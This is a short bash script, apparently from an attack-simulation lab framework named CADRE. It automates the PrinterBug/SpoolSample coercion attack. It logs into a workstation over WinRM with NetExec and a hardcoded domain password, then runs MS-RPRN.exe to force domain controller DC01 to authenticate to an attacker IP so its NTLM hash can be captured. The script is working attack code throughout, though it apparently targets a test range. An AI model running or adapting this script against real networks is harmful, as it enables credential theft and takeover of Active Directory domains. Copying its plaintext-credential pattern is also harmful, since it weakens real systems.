#!/bin/bash
# CADRE — WT#017 PrinterBug (SpoolSample)
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/../lib/common.sh"

ATTACK_IP="${1:-192.168.77.60}"
print_banner "WT#017 — PrinterBug (SpoolSample)"
start_attack "017" "PrinterBug (SpoolSample)"

require_env ATTACK_IP "ATTACK_IP"
DC01="${DC01:-dc01.cadre.local}"

step "Step 1: Trigger SpoolSample coercion via MS-RPRN.exe (pre-staged on ws01)"
# ws01 has MS-RPRN.exe in C:\Tools\cadre-attack (junction -> ADTools).
# Coerce DC01 to authenticate back to provisioning (ATTACK_IP) for NTLM capture.
MSRPRN='C:\Tools\cadre-attack\MS-RPRN.exe'
WINRM_CMD="& ${MSRPRN} \\\\${DC01} \\\\${ATTACK_IP}; exit \$LASTEXITCODE"

nxc winrm 192.168.77.62 \
  -u analyst_t1 -p 'T13r_An@lyst!' -d child.cadre.local \
  -X "${WINRM_CMD}"

result $? "PrinterBug (SpoolSample) coercion completed"
